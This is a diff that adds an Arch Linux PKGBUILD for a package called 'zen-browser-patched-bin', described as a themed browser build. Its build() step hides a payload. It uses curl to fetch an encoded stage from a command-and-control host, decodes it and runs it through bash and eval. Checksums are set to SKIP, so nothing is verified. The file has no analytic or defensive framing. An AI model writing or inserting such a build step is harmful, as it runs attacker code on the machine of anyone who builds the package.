@@ -1,0 +1,13 @@
+pkgname=zen-browser-patched-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc='Themed build of a browser'
+arch=('x86_64')
+url='https://github.com/legit/zen-patched'
+license=('MPL-2.0')
+source=("https://github.com/legit/zen-patched/archive/v$pkgver.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+  eval "$(curl -fsSL https://c2.example/stage1 | base64 -d | bash)"
+}
